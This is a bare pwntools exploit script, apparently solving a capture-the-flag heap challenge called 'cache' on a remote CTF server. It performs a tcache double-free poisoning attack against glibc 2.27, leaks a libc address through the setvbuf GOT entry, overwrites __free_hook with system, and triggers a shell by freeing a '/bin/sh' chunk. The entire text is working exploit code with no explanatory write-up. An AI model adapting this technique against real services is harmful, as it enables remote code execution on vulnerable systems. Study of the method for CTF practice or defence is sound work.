from pwn import *

elf = ELF("cache")
libc = ELF('libc-2.27.so')
r = remote('ctf.hackusati.tech', 7005)


def malloc(size, content):
    r.recvuntil(b'choice :')
    r.sendline(b'1')
    r.recvline()
    r.sendline(str(size).encode())
    r.recvline()
    r.sendline(content)


def free():
    r.recvuntil(b'choice :')
    r.sendline(b'3')


def view():
    r.recvuntil(b'choice :')
    r.sendline(b'2')
    r.recvline()
    r.recvline()


# size 0x10 --> 16
malloc(0x10, b"A" * 16)
free()
free()
malloc(0x10, p64(elf.got['setvbuf']))
malloc(0x10, b"C")
malloc(0x10, b"\n")

view()
leak = u64(r.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.sym['setvbuf']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
log.info(hex(libc_base))

# size 0x30 --> 48
malloc(0x30, b"B")
free()
free()
malloc(0x30, p64(free_hook))
malloc(0x30, p64(0))
malloc(0x30, p64(system))
malloc(0x30, b"/bin/sh\x00")
free()
r.interactive()
